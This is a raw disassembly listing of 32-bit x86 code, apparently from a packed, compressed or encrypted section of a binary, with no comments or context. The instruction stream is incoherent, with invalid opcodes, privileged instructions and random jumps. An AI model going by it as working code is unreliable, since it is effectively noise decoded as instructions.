  41729c:	test   BYTE PTR [edi-0x2d],ch
  41729f:	call   0x11e10211
  4172a4:	into   
  4172a5:	jl     0x41728c
  4172a7:	out    dx,eax
  4172a8:	imul   edi,DWORD PTR [ecx],0xfffffff5
  4172ab:	jns    0x417269
  4172ad:	mov    edi,0x2250c70e
  4172b2:	lea    esi,[ebx+eax*4]
  4172b5:	push   ebx
  4172b6:	sbb    BYTE PTR [ebx-0x15],al
  4172b9:	scas   al,BYTE PTR es:[edi]
  4172ba:	push   ds
  4172bb:	mov    ecx,0x7068aaa0
  4172c0:	out    dx,al
  4172c1:	imul   ebx,DWORD PTR [ecx+0x5c460f59],0x70
  4172c8:	pop    ebp
  4172c9:	outs   dx,DWORD PTR ds:[esi]
  4172ca:	xor    ah,BYTE PTR [ebp+0x52]
  4172cd:	push   cs
  4172ce:	mul    BYTE PTR [ebx-0x78]
  4172d1:	jnp    0x417351
  4172d3:	adc    DWORD PTR [ecx-0x53],edx
  4172d6:	cmp    eax,0x4e504248
  4172db:	cmp    DWORD PTR [esi-0x7fee3d5a],ebx
  4172e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172e2:	jnp    0x417331
  4172e4:	mov    ebx,0x2083af60
  4172e9:	mov    dh,0x11
  4172eb:	out    0x11,al
  4172ed:	stos   DWORD PTR es:[edi],eax
  4172ee:	sbb    al,0x91
  4172f0:	and    al,0x7f
  4172f2:	mov    eax,ds:0x7b163844
  4172f7:	ins    BYTE PTR es:[edi],dx
  4172f8:	je     0x41730d
  4172fa:	jnp    0x4172e1
  4172fc:	shl    BYTE PTR ds:0x9db94353,1
  417302:	inc    ebx
  417303:	test   ebx,ebp
  417305:	add    ebp,edx
  417307:	sbb    edx,ebx
  417309:	cmp    eax,0x663c2c67
  41730f:	mov    ds:0xe6060fa8,al
  417314:	mov    dh,0xba
  417316:	ss inc ebx
  417318:	test   eax,0x158dd4b6
  41731d:	daa    
  41731e:	(bad)  
  41731f:	fst    DWORD PTR [ecx]
  417321:	cdq    
  417322:	sbb    eax,0x5b661b01
  417327:	cmp    ebp,ebx
  417329:	mov    ch,bl
  41732b:	fucomp st(3)
  41732d:	add    ecx,DWORD PTR [esi-0x37813184]
  417333:	(bad)  
  417334:	pop    eax
  417335:	retf   
  417336:	shl    DWORD PTR [edx],0x17
  417339:	sub    ecx,DWORD PTR [edx-0x4]
  41733c:	stos   DWORD PTR es:[edi],eax
  41733d:	inc    edx
  41733e:	sub    dh,cl
  417340:	dec    edi
  417341:	cdq    
  417342:	sub    DWORD PTR [ebp+0x28],ebx
  417345:	out    0x4d,eax
  417347:	pushf  
  417348:	push   edi
  417349:	or     BYTE PTR [edi-0x63],0x99
  41734d:	lds    ebp,FWORD PTR [ebx+0x10844851]
  417353:	lds    ecx,FWORD PTR [edi-0x72]
  417356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417357:	pop    ss
  417358:	(bad)  
  417359:	or     cl,BYTE PTR [edi-0x68090ebe]
  41735f:	jl     0x41739a
  417361:	hlt    
  417362:	add    ecx,esp
  417364:	cdq    
  417365:	test   al,0x98
  417367:	mov    ds:0x66e0a80b,eax
  41736c:	ret    0xb101
  41736f:	mov    ah,0x15
  417371:	addr16 dec ecx
  417373:	sahf   
  417374:	add    al,0xac
  417376:	xor    edi,DWORD PTR [ebx]
  417378:	sbb    esp,DWORD PTR [ecx]
  41737a:	mov    esp,0x3c864e2b
  41737f:	gs iret 
  417381:	adc    esi,DWORD PTR [esi-0x5754c511]
  417387:	cmovge edx,DWORD PTR [eax]
  41738a:	mov    DWORD PTR [esi+0x4a57af48],ebp
  417390:	inc    eax
  417391:	loopne 0x417331
  417393:	pop    edi
  417394:	outs   dx,DWORD PTR ss:[esi]
  417396:	pop    esp
  417397:	mov    DWORD PTR [eax-0x2d],ebx
  41739a:	add    BYTE PTR [ebx+0x378443a2],bl
  4173a0:	leave  
  4173a1:	stos   BYTE PTR es:[edi],al
  4173a2:	stc    
  4173a3:	dec    ebp
  4173a4:	fsub   st,st(3)
  4173a6:	and    eax,0x574700ec
  4173ab:	push   edi
  4173ac:	pop    es
  4173ad:	ja     0x417375
  4173af:	mov    dl,ch
  4173b1:	push   ds
  4173b2:	mov    al,0xdc
  4173b4:	sahf   
  4173b5:	(bad)  
  4173b6:	into   
  4173b7:	fistp  QWORD PTR [ebp+ebp*1+0x44]
  4173bb:	or     eax,0x520acc6d
  4173c0:	mov    esp,0x7edd866c
  4173c5:	cmp    ecx,DWORD PTR [eax]
  4173c7:	loop   0x41741c
  4173c9:	cmp    edi,DWORD PTR [ecx+0x209d9d3a]
  4173cf:	cmp    ch,BYTE PTR [eax]
  4173d1:	sbb    ebp,DWORD PTR [edx-0x2f]
  4173d4:	jl     0x4173dc
  4173d6:	dec    ebp
  4173d7:	adc    al,0xd9
  4173d9:	loop   0x4173c6
  4173db:	fistp  DWORD PTR [eax-0x65]
  4173de:	inc    esi
  4173df:	outs   dx,DWORD PTR ds:[esi]
  4173e0:	cmp    BYTE PTR [eax],bh
  4173e2:	mov    ecx,DWORD PTR [ecx]
  4173e4:	push   cs
  4173e5:	test   eax,0xfaae5f32
  4173ea:	clc    
  4173eb:	mov    bh,0xec
  4173ed:	jmp    0x41736f
  4173ef:	mov    bl,bl
  4173f1:	sbb    al,0x13
  4173f3:	jne    0x417386
  4173f5:	sbb    DWORD PTR [eax-0x556c28b6],0x30d5ae17
  4173ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417400:	pop    esp
  417401:	fisub  WORD PTR [esi-0x79]
  417404:	pop    edx
  417405:	pop    ecx
  417406:	iret   
  417407:	mov    dh,0xd
  417409:	rcr    DWORD PTR [edx+0x3b],cl
  41740c:	sub    DWORD PTR [edx+0x1f],ebp
  41740f:	test   eax,0x29d32b4b
  417414:	xchg   BYTE PTR [esi-0x4d],bh
  417417:	jp     0x41739f
  417419:	fistp  DWORD PTR [ecx-0x74]
  41741c:	push   0xffffffbd
  41741e:	pop    edi
  41741f:	jo     0x417441
  417421:	push   ds
  417422:	inc    eax
  417423:	jno    0x4174a3
  417425:	inc    edi
  417426:	and    eax,0x714e4691
  41742b:	pushf  
  41742c:	in     al,0x3c
  41742e:	push   edx
  41742f:	adc    eax,DWORD PTR [esp+esi*2]
  417432:	jno    0x417430
  417434:	out    0x47,al
  417436:	sub    ecx,DWORD PTR [ebx+0x702f226b]
  41743c:	dec    edx
  41743d:	bound  ebp,QWORD PTR [eax+0x169230ae]
  417443:	dec    ebp
  417444:	push   edx
  417445:	sti    
  417446:	push   DWORD PTR [ecx+edi*2+0x2f344c6c]
  41744d:	popf   
  41744e:	loop   0x41744c
  417450:	jmp    0x4174b3
  417452:	sub    eax,0xa0b59a39
  417457:	ins    DWORD PTR es:[edi],dx
  417458:	mov    ebp,DWORD PTR [esi+eax*4-0x5b9c373e]
  41745f:	lods   eax,DWORD PTR ds:[esi]
  417460:	mov    WORD PTR [ebx],gs
  417462:	xlat   BYTE PTR ds:[ebx]
  417463:	pushf  
  417464:	test   al,0x4b
  417466:	jmp    FWORD PTR [eax+0x37]
  417469:	test   DWORD PTR [ecx],0x31f0e287
  41746f:	xor    eax,0x44f8f451
  417474:	outs   dx,DWORD PTR ds:[esi]
  417475:	dec    ebp
  417476:	sbb    BYTE PTR [ebx+0x6550a5df],ch
  41747c:	bound  bp,DWORD PTR ss:[esi-0x62]
  417481:	ds hlt 
  417483:	pop    edi
  417484:	mov    WORD PTR ds:0xd4132620,ss
  41748a:	adc    al,0xa9
  41748c:	xchg   ebx,eax
  41748d:	mov    esp,0xa4598e97
  417492:	inc    ecx
  417493:	shr    dh,0x4b
  417496:	add    dh,BYTE PTR [edx]
  417498:	or     al,0x98
  41749a:	rcl    BYTE PTR [ecx+0x15],0x1
  41749e:	push   edx
  41749f:	cli    
  4174a0:	push   edi
  4174a1:	mov    eax,0xcfaf7cbe
  4174a6:	sar    DWORD PTR [edi],1
  4174a8:	(bad)
  4174ac:	dec    edi
  4174ad:	pop    edx
  4174ae:	sbb    BYTE PTR [eax-0x6e],bh
  4174b1:	outs   dx,DWORD PTR ds:[esi]
  4174b2:	pop    eax
  4174b3:	jo     0x417528
  4174b5:	int    0x5a
  4174b7:	cmp    DWORD PTR [esi],esp
  4174b9:	test   eax,0x7ec701f9
  4174be:	jbe    0x417471
  4174c0:	retf   
  4174c1:	test   DWORD PTR [edx-0x23],edi
  4174c4:	pop    esp
  4174c5:	inc    eax
  4174c6:	(bad)  
  4174c7:	push   ecx
  4174c8:	inc    ebp
  4174c9:	lods   al,BYTE PTR ds:[esi]
  4174ca:	inc    ebx
  4174cb:	inc    edi
  4174cc:	xor    edx,DWORD PTR [esi-0x24ff1e50]
  4174d2:	or     eax,0x49dcad76
  4174d7:	daa    
  4174d8:	pop    ss
  4174d9:	cdq    
  4174da:	(bad)  
  4174db:	push   ebx
  4174dc:	sbb    al,0x0
  4174de:	stos   DWORD PTR es:[edi],eax
  4174df:	outs   dx,DWORD PTR ds:[esi]
  4174e0:	aad    0x98
  4174e2:	int    0xc9
  4174e4:	pop    es
  4174e5:	xchg   ebx,eax
  4174e6:	iret   
  4174e7:	cdq    
  4174e8:	inc    edi
  4174e9:	mov    al,0x59
  4174eb:	in     eax,0xa3
  4174ed:	sar    edi,0x57
  4174f0:	aaa    
  4174f1:	(bad)  
  4174f2:	aad    0xce
  4174f4:	lods   eax,DWORD PTR ds:[esi]
  4174f5:	in     al,dx
  4174f6:	cmp    ch,ah
  4174f8:	mov    es,WORD PTR [ebp-0x1ef3f97f]
  4174fe:	jmp    0xdb6d:0x7eb14228
  417505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417506:	sahf   
  417507:	repnz sub DWORD PTR [esi+0x6da444f8],eax
  41750e:	hlt    
  41750f:	cwde   
  417510:	ins    DWORD PTR es:[edi],dx
  417511:	cwde   
  417512:	outs   dx,DWORD PTR ds:[esi]
  417513:	jle    0x3e60bdf4
  417519:	sub    BYTE PTR [edi],0x41
  41751c:	xor    DWORD PTR [ebx],0x69
  41751f:	loope  0x4174c3
  417521:	jo     0x417563
  417523:	dec    ecx
  417524:	xor    dl,BYTE PTR [eax+edx*8-0x764a01dc]
  41752b:	push   cs
  41752c:	call   0x6780:0x3d57ff5a
  417533:	scas   al,BYTE PTR es:[edi]
  417534:	jbe    0x4174cf
  417536:	bound  esp,QWORD PTR ds:0xdf6228b1
  41753c:	in     eax,0xfb
  41753e:	or     dl,ch
  417540:	ja     0x4175b7
  417542:	pop    ebx
  417543:	fbstp  TBYTE PTR [eax-0x2784ec8d]
  417549:	out    dx,al
  41754a:	sub    esp,DWORD PTR [edx+ebp*8-0x15]
  41754e:	adc    BYTE PTR [edx],bl
  417550:	cdq    
  417551:	jbe    0x417510
  417553:	out    dx,al
  417554:	(bad)  
  417555:	pop    DWORD PTR [ebx-0x78]
  417558:	(bad)  
  41755a:	inc    edx
  41755b:	and    edi,ebx
  41755d:	inc    ebp
  41755e:	aaa    
  41755f:	ja     0x41758e
  417561:	scas   eax,DWORD PTR es:[edi]
  417562:	or     al,0xe7
  417564:	fidivr WORD PTR [eax-0x7f]
  417567:	pop    ecx
  417568:	jnp    0x4175bc
  41756a:	out    0x7e,al
  41756c:	jnp    0x4175bf
  41756e:	div    BYTE PTR [ebx]
  417570:	ja     0x4175bd
  417572:	and    DWORD PTR [eax],0xd20e1416
  417578:	jb     0x41757f
  41757a:	ins    BYTE PTR es:[edi],dx
  41757b:	dec    ebp
  41757c:	push   ds
  41757d:	push   ss
  41757e:	and    eax,0xbbcc591
  417583:	mov    BYTE PTR [ebx+esi*8-0x52],dh
  417587:	xor    BYTE PTR [ecx+ebx*1+0x33],bh
  41758b:	add    al,0xc8
  41758d:	and    eax,0xb62a2844
  417592:	sub    DWORD PTR [edx],edi
  417594:	ds push es
  417596:	ins    BYTE PTR es:[edi],dx
  417597:	xchg   esp,eax
  417598:	in     eax,0xde
  41759a:	or     ebx,ebp
  41759c:	iret   
  41759d:	pop    ebp
  41759e:	mov    edx,0xee9c8aa0
  4175a3:	cs cs pop eax
  4175a6:	sub    al,0xb5
  4175a8:	fistp  QWORD PTR [esi+0x3e]
  4175ab:	daa    
  4175ac:	dec    ebx
  4175ad:	scas   eax,DWORD PTR es:[edi]
  4175ae:	mov    cl,0x57
  4175b0:	sub    bh,BYTE PTR [edi-0x19]
  4175b3:	shr    BYTE PTR [edx-0x6d],0x84
  4175b7:	xchg   esi,eax
  4175b8:	adc    al,0xf
  4175ba:	mov    DWORD PTR [eax-0x4b9d4d65],esi
  4175c0:	arpl   cx,sp
  4175c2:	or     bh,BYTE PTR [ecx-0x316e02fd]
  4175c8:	fldenv [ebx-0xe38ca80]
  4175ce:	add    bh,dh
  4175d0:	sbb    BYTE PTR [esi-0x6f],0x6f
  4175d4:	jmp    0x4c3e:0x3e6aab7b
  4175db:	int3   
  4175dc:	mov    esp,0xd3058aa3
  4175e1:	xor    al,BYTE PTR [ecx]
  4175e3:	mov    edi,0xe05c4609
  4175e8:	sbb    DWORD PTR [edx],ecx
  4175ea:	jg     0x417630
  4175ec:	push   0xffffffee
  4175ee:	aaa    
  4175ef:	lods   al,BYTE PTR ds:[esi]
  4175f0:	inc    ecx
  4175f1:	pop    ss
  4175f2:	jle    0x41760a
  4175f4:	pop    eax
  4175f5:	scas   al,BYTE PTR es:[edi]
  4175f6:	adc    ch,dl
  4175f8:	or     bl,bh
  4175fa:	mov    bh,0x83
  4175fc:	xor    ebp,edi
  4175fe:	mov    esp,0x77edae98
  417603:	sti    
  417604:	in     eax,0x26
  417606:	outs   dx,BYTE PTR ds:[esi]
  417607:	data16 daa 
  417609:	mov    bl,0xe6
  41760b:	push   0xfc785f57
  417610:	and    bl,BYTE PTR [ecx+ebx*4+0x2ec83564]
  417617:	xchg   edx,eax
  417618:	inc    edi
  417619:	adc    al,0x7e
  41761b:	scas   al,BYTE PTR es:[edi]
  41761c:	fstp   QWORD PTR ds:0x319253ca
  417622:	int    0xd3
  417624:	sbb    ebx,DWORD PTR [ecx+0x363355c7]
  41762a:	dec    edi
  41762b:	lea    ecx,[esi+0x32a47cd9]
  417631:	shl    BYTE PTR [edi],cl
  417633:	(bad)  [ecx]
  417635:	and    bh,bl
  417637:	mov    bl,0xa6
  417639:	imul   esp,ebx,0x609638aa
  41763f:	jo     0x41760a
  417641:	mov    esp,0x2c1a9301
  417646:	inc    eax
  417647:	leave  
  417648:	inc    ebp
  417649:	adc    DWORD PTR [esi+0x4875868c],esi
  41764f:	stos   DWORD PTR es:[edi],eax
  417650:	(bad)  
  417651:	clc    
  417652:	inc    edi
  417653:	aad    0x30
  417655:	int    0x7a
  417657:	pusha  
  417658:	stos   DWORD PTR es:[edi],eax
  417659:	int3   
  41765a:	pop    esp
  41765b:	sub    eax,DWORD PTR [ecx]
  41765d:	pop    esi
  41765e:	pop    bp
  417660:	inc    edx
  417661:	bound  ecx,QWORD PTR [edi-0x15]
  417664:	in     eax,dx
  417665:	mov    ebx,0x7ac15f2f
  41766a:	xchg   ecx,eax
  41766b:	ins    DWORD PTR es:[edi],dx
  41766c:	adc    ebx,DWORD PTR [edx-0x48a1e3ec]
  417672:	inc    esi
  417673:	test   eax,0x9946f541
  417678:	push   edx
  417679:	shl    BYTE PTR [esi],1
  41767b:	lock add al,0xe7
  41767e:	mov    ds:0xc3d3ae53,ax
  417684:	sub    al,bl
  417686:	pop    edi
  417687:	ja     0x417640
  417689:	aaa    
  41768a:	(bad)
  41768d:	xchg   edx,eax
  41768e:	not    ecx
  417690:	adc    DWORD PTR ds:0xf71854ee,ebp
  417696:	add    cl,BYTE PTR [edx-0x56]
  417699:	imul   edi,DWORD PTR [edx],0x62
  41769c:	sub    dl,BYTE PTR ds:0x24675112
  4176a2:	pop    ss
  4176a3:	dec    edi
  4176a4:	ror    BYTE PTR [edx-0x42],cl
  4176a7:	fld    TBYTE PTR [ecx]
  4176a9:	xchg   esi,eax
  4176aa:	dec    eax
  4176ab:	enter  0xa7d7,0x40
  4176af:	out    0xb7,eax
  4176b1:	fwait
  4176b2:	(bad)  
  4176b3:	(bad)
  4176b6:	mov    edx,edi
  4176b8:	adc    dh,bl
  4176ba:	push   ebx
  4176bb:	xchg   ebp,eax
  4176bc:	icebp  
  4176bd:	jbe    0x417645
  4176bf:	jns    0x4176ab
  4176c1:	imul   ebp,esi,0x4df88afc
  4176c7:	ja     0x417719
  4176c9:	shl    ch,1
  4176cb:	icebp  
  4176cc:	push   ecx
  4176cd:	popa   
  4176ce:	dec    ecx
  4176cf:	mov    dh,0xf0
  4176d1:	sub    DWORD PTR [edx],ebx
  4176d3:	dec    ebp
  4176d4:	push   0xffffff9e
  4176d6:	xchg   esi,eax
  4176d7:	repz push ebx
  4176d9:	stos   BYTE PTR es:[edi],al
  4176da:	or     al,0x24
  4176dc:	cmp    BYTE PTR [eax+0x429b1fb2],cl
  4176e2:	mov    fs,ebp
  4176e4:	pop    ebx
  4176e5:	les    ebp,FWORD PTR [esi+0x75]
  4176e8:	or     eax,0xe300fb7b
  4176ed:	in     eax,dx
  4176ee:	icebp  
  4176ef:	outs   dx,DWORD PTR ds:[esi]
  4176f0:	add    edx,DWORD PTR [ecx-0xb5d8c9]
  4176f6:	sti    
  4176f7:	xor    eax,0x327dd9c9
  4176fc:	hlt    
  4176fd:	sub    ah,cl
  4176ff:	and    dl,BYTE PTR [eax-0x3319203e]
  417705:	loopne 0x417719
  417707:	mov    ebx,0xdf42abe2
  41770c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41770d:	cld    
  41770e:	aad    0xca
  417710:	or     esi,DWORD PTR [edi]
  417712:	fcomp  DWORD PTR [esi]
  417714:	ret    
  417715:	(bad)  
  417716:	std    
  417717:	les    esp,FWORD PTR [ebx+eax*4-0x29]
  41771b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41771c:	rol    BYTE PTR [ebp-0x10],1
  41771f:	int    0xae
  417721:	std    
  417722:	dec    ebp
  417723:	aam    0x81
  417725:	mov    dh,0xc6
  417727:	sti    
  417728:	mov    dh,0xb0
  41772a:	ins    BYTE PTR es:[edi],dx
  41772b:	push   ebx
  41772c:	dec    edi
  41772d:	hlt    
  41772e:	scas   al,BYTE PTR es:[edi]
  41772f:	ins    BYTE PTR es:[edi],dx
  417730:	popf   
  417731:	cmp    ebp,0xfffffff1
  417734:	test   BYTE PTR [edi-0x7bd8ba4b],cl
  41773a:	scas   eax,DWORD PTR es:[edi]
  41773b:	adc    DWORD PTR [ebx+0xabf642e],0xa8e1c6c0
  417745:	dec    esp
  417746:	loope  0x4176d4
  417748:	fs mov edi,0x4165f545
  41774e:	loop   0x4177c7
  417750:	add    eax,0x6282f4f7
  417755:	pop    esp
  417756:	xor    BYTE PTR ds:0x40c20029,al
  41775c:	repz (bad) 
  41775e:	gs xchg edi,eax
  417760:	jo     0x4176f4
  417762:	popa   
  417763:	jmp    FWORD PTR [ecx+0x35bc37e2]
  417769:	(bad)  
  41776a:	mov    ecx,0xde1660fc
  41776f:	std    
  417770:	mov    BYTE PTR [esi+0x256ae51f],bl
  417776:	loop   0x4177d1
  417778:	lahf   
  417779:	jle    0x4177ca
  41777b:	pusha  
  41777c:	(bad)  
  41777d:	scas   al,BYTE PTR es:[edi]
  41777e:	dec    ecx
  41777f:	mov    ds:0xc1e576a5,eax
  417784:	sti    
  417785:	xchg   ebp,eax
  417786:	push   0xffffffb4
  417788:	(bad)  
  417789:	test   eax,0x84fa11b
  41778e:	scas   eax,DWORD PTR es:[edi]
  41778f:	test   BYTE PTR [edx],0xcf
  417792:	or     dh,bl
  417794:	sbb    DWORD PTR [edi+0x1f72870f],ebx
  41779a:	xor    eax,0xf84c076
  41779f:	add    dh,BYTE PTR [ebp-0x5c]
  4177a2:	and    ebp,esi
  4177a4:	imul   edx,DWORD PTR [edx+0x8],0x94e21a1e
  4177ab:	push   edi
  4177ac:	push   0x9aaf1d3d
  4177b1:	xchg   edx,eax
  4177b2:	scas   eax,DWORD PTR es:[edi]
  4177b3:	xor    ebx,edi
  4177b5:	xchg   ebx,eax
  4177b6:	dec    esi
  4177b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177b8:	mov    ebx,0x5063ad35
  4177bd:	xacquire xchg DWORD PTR [edx],ebp
  4177c0:	xor    al,0x34
  4177c2:	sti    
  4177c3:	push   ebx
  4177c4:	inc    edi
  4177c5:	inc    ecx
  4177c6:	or     eax,0xe2da5539
  4177cb:	xor    BYTE PTR [edi+0x3079530d],0x7a
  4177d2:	loopne 0x417815
  4177d4:	push   eax
  4177d5:	les    eax,FWORD PTR ds:0x54467a4e
  4177db:	idiv   BYTE PTR [eax-0x67e82ed1]
  4177e1:	aad    0xec
  4177e3:	sbb    DWORD PTR [ebx-0x27],ecx
  4177e6:	push   ss
  4177e7:	arpl   di,di
  4177e9:	int3   
  4177ea:	jl     0x4177ed
  4177ec:	mov    ebp,0xbb4a00f3
  4177f1:	xchg   ebx,eax
  4177f2:	push   ecx
  4177f3:	fs cmp ebp,esi
  4177f6:	jecxz  0x417843
  4177f8:	enter  0x68c,0x7a
  4177fc:	mov    al,ds:0x275c1cc8
  417801:	mov    cl,BYTE PTR [eax-0x2769d06b]
  417807:	inc    edx
  417808:	add    al,0xcc
  41780a:	sbb    DWORD PTR [eax+0x5ae2f642],edi
  417810:	pop    es
  417811:	sub    BYTE PTR [edi],cl
  417813:	sahf   
  417814:	nop
  417815:	ficomp DWORD PTR [edx+0x9]
  417818:	adc    DWORD PTR [ecx+0x25],edx
  41781b:	fwait
  41781c:	test   eax,eax
  41781e:	dec    ecx
  41781f:	test   eax,0x8a0dca93
  417824:	cdq    
  417825:	mov    WORD PTR [eax+0x72],gs
  417828:	cmp    ah,BYTE PTR [edx-0x63e931ec]
  41782e:	pop    es
  41782f:	sbb    al,0x52
  417831:	cld    
  417832:	addr16 push ebp
  417834:	pop    esi
  417835:	data16 test al,ch
  417838:	and    eax,0xb004231
  41783d:	xchg   ebx,eax
  41783e:	fadd   QWORD PTR [ecx-0x3827b158]
  417844:	imul   ecx,DWORD PTR [esi],0xffffffb6
  417847:	add    esp,DWORD PTR [eax-0x1b]
  41784a:	pop    esi
  41784b:	sti    
  41784c:	sbb    DWORD PTR [esi],edx
  41784e:	inc    ebx
  41784f:	popf   
  417850:	mov    es,WORD PTR [ebx]
  417852:	or     ch,0x40
  417855:	mov    eax,0xf0398bb4
  41785a:	dec    eax
  41785b:	je     0x4178d0
  41785d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41785e:	push   DWORD PTR [ebp-0x71a318f0]
  417864:	aas    
  417865:	pop    edx
  417866:	aam    0x41
  417868:	ins    BYTE PTR es:[edi],dx
  417869:	ror    BYTE PTR ds:0x58bdbf88,cl
  41786f:	imul   esp,DWORD PTR [eax+esi*4],0x26
  417873:	mov    ds:0x87ab91dd,eax
  417878:	pop    ss
  417879:	aaa    
  41787a:	and    ecx,edi
  41787c:	data16 or BYTE PTR [edx],0xd3
  417880:	aad    0xe7
  417882:	leave  
  417883:	aaa    
  417884:	loope  0x4178d6
  417886:	xor    eax,0xf78ed74
  41788b:	fwait
  41788c:	rcr    BYTE PTR [eax-0x42],0xb5
  417890:	dec    edi
  417891:	outs   dx,DWORD PTR ds:[esi]
  417892:	inc    edx
  417893:	lods   eax,DWORD PTR ds:[esi]
  417894:	nop
  417895:	in     eax,dx
  417896:	leavew 
  417898:	rcr    DWORD PTR es:[edi-0x1c029e4],1
  41789f:	mov    cr5,eax
  4178a2:	push   esi
  4178a3:	lods   eax,DWORD PTR ds:[esi]
  4178a4:	shl    DWORD PTR [ebx+edx*2+0x1c],1
  4178a8:	lods   eax,DWORD PTR ds:[esi]
  4178a9:	inc    esp
  4178aa:	and    ebp,esp
  4178ac:	lock pop edx
  4178ae:	scas   al,BYTE PTR es:[edi]
  4178af:	jmp    0x417856
  4178b1:	adc    al,0xb8
  4178b3:	es ss aas 
  4178b6:	into   
  4178b7:	popf   
  4178b8:	add    bl,ch
  4178ba:	fst    QWORD PTR ds:0x85e372c2
  4178c0:	fs pop ebp
  4178c2:	xor    bl,BYTE PTR [edx-0x5b1ab3a8]
  4178c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178c9:	rcr    BYTE PTR [ecx-0xc],cl
  4178cc:	sbb    al,ah
  4178ce:	cmp    ch,dl
  4178d0:	dec    edx
  4178d1:	or     al,0xfe
  4178d3:	pop    ds
  4178d4:	sub    eax,0x23ff543a
  4178d9:	dec    ebx
  4178da:	ficomp DWORD PTR [esi]
  4178dc:	fwait
  4178dd:	shr    ebx,0xbb
  4178e0:	ins    DWORD PTR es:[edi],dx
  4178e1:	mov    WORD PTR [ebp+eax*1-0x67],ss
  4178e5:	jnp    0x41789c
  4178e7:	jp     0x4178cc
  4178e9:	call   0xd310:0x9ed11e46
  4178f0:	cdq    
  4178f1:	mov    ds:0x82e88f12,eax
  4178f6:	adc    ebp,DWORD PTR [edi-0x3d]
  4178f9:	add    BYTE PTR [ecx],cl
  4178fb:	scas   eax,DWORD PTR es:[edi]
  4178fc:	pop    es
  4178fd:	push   ebp
  4178fe:	mov    bh,0x33
  417900:	inc    ebp
  417901:	xor    eax,0x9aa55754
  417906:	or     eax,DWORD PTR [esi-0x24]
  417909:	cbw    
  41790b:	jb     0x417924
  41790d:	enter  0x5a13,0x29
  417911:	sub    ebx,DWORD PTR [ecx+0x7a]
  417914:	sub    al,0x6f
  417916:	mov    esi,0x76d3745d
  41791b:	mov    ebx,0x2dd7d60e
  417920:	lea    ecx,[esi]
  417922:	dec    edx
  417923:	cld    
  417924:	jne    0x417913
  417926:	scas   al,BYTE PTR es:[edi]
  417927:	in     eax,dx
  417928:	bound  ebp,QWORD PTR [esi+eax*4]
  41792b:	pop    edx
  41792c:	mov    ch,0x56
  41792e:	jbe    0x417942
  417930:	push   eax
  417931:	mov    ah,ah
  417933:	nop
  417934:	sahf   
  417935:	lds    edx,FWORD PTR [ebp-0x24fcc0e5]
  41793b:	imul   ebp,esi,0x7f
  41793e:	add    DWORD PTR cs:[esi+0x51885ad5],ecx
  417945:	icebp  
  417946:	jbe    0x417901
  417948:	mov    eax,DWORD PTR [esi+0x4c65b158]
  41794e:	iret   
  41794f:	inc    ecx
  417950:	cmp    esp,DWORD PTR [edi-0x6e]
  417953:	mov    eax,ds:0x4a0e4070
  417958:	nop
  417959:	inc    ebp
  41795a:	mov    eax,ds:0xf9b7c1a7
  41795f:	out    dx,al
  417960:	dec    eax
  417961:	loopne 0x417918
  417963:	aam    0x91
  417965:	fisub  DWORD PTR [edi+ebp*1+0x79]
  417969:	repnz push ebx
  41796b:	mov    bl,dl
  41796d:	cmp    DWORD PTR [edx+0x5d],ebp
  417970:	test   eax,0xf87ced5a
  417975:	mov    ch,BYTE PTR [esi-0x58]
  417978:	(bad)  
  417979:	(bad)
  41797c:	xchg   ebx,eax
  41797d:	loopne 0x417962
  41797f:	popf   
  417980:	rcl    BYTE PTR [edx-0x74],1
  417983:	sbb    BYTE PTR [ecx],bl
  417985:	(bad)  
  417986:	adc    DWORD PTR [ebx-0x73f4492c],edx
  41798c:	and    ah,BYTE PTR [ebp+esi*8+0x6780cf2f]
  417993:	stos   DWORD PTR es:[edi],eax
  417994:	out    0xdb,eax
  417996:	sub    eax,0x8b5879be
  41799b:	mov    edx,0x181de709
  4179a0:	test   al,0xf8
  4179a2:	into   
  4179a3:	pop    ebx
  4179a4:	cwde   
  4179a5:	adc    bh,ch
  4179a7:	lahf   
  4179a8:	pop    ecx
  4179a9:	mov    esi,0xcd9be143
  4179ae:	(bad)  
  4179af:	mov    dh,0xda
  4179b1:	out    dx,al
  4179b2:	jl     0x417934
  4179b4:	push   ds
  4179b5:	shr    BYTE PTR [edi-0x12],0x77
  4179b9:	mov    BYTE PTR [edx+0x2ffe713c],0x43
  4179c0:	and    eax,0x491253fa
  4179c5:	xchg   edi,eax
  4179c6:	adc    ecx,DWORD PTR [esi+0x39d4a710]
  4179cc:	gs inc edi
  4179ce:	and    eax,0x919d7d54
  4179d3:	fistp  QWORD PTR [edx-0x67c1510a]
  4179d9:	mov    ecx,0x22795ff2
  4179de:	or     eax,0x4299bbc5
  4179e3:	mov    eax,0x7a67dc79
  4179e8:	sub    eax,0xc427062
  4179ed:	mov    dh,0xbb
  4179ef:	jecxz  0x417a0a
  4179f1:	in     eax,0x9c
  4179f3:	lahf   
  4179f4:	(bad)  
  4179f6:	and    al,0x2e
  4179f8:	inc    esp
  4179f9:	inc    esi
  4179fa:	(bad)  
  4179fb:	bound  esp,QWORD PTR [edi-0x401cf30]
  417a01:	jae    0x4179a0
  417a03:	adc    edi,DWORD PTR [edi]
  417a05:	or     DWORD PTR [ebx-0x7e5d0587],esi
  417a0b:	jl     0x417a7a
  417a0d:	out    dx,eax
  417a0e:	push   ebp
  417a0f:	cld    
  417a10:	jl     0x417a1d
  417a12:	cmp    DWORD PTR [ebx-0x51],0xffffffc8
  417a16:	ja     0x417a67
  417a18:	call   0x1bb33488
  417a1d:	sbb    edx,DWORD PTR [ebp-0x2c8192e4]
  417a23:	mov    ds:0x5a34cdc6,eax
  417a28:	dec    ebx
  417a29:	add    dh,al
  417a2b:	addr16 mov edi,0xbae1cd6f
  417a31:	imul   ecx,DWORD PTR [ebp+0x8d330f2],0xf34b9baf
  417a3b:	dec    BYTE PTR [ebx+0x27]
  417a3e:	add    esi,DWORD PTR ds:0x688155db
  417a44:	shl    DWORD PTR [edi-0x29be9dda],cl
  417a4a:	fnstsw WORD PTR [eax+0x30]
  417a4d:	pop    ebx
  417a4e:	xor    al,0xf4
  417a50:	push   ds
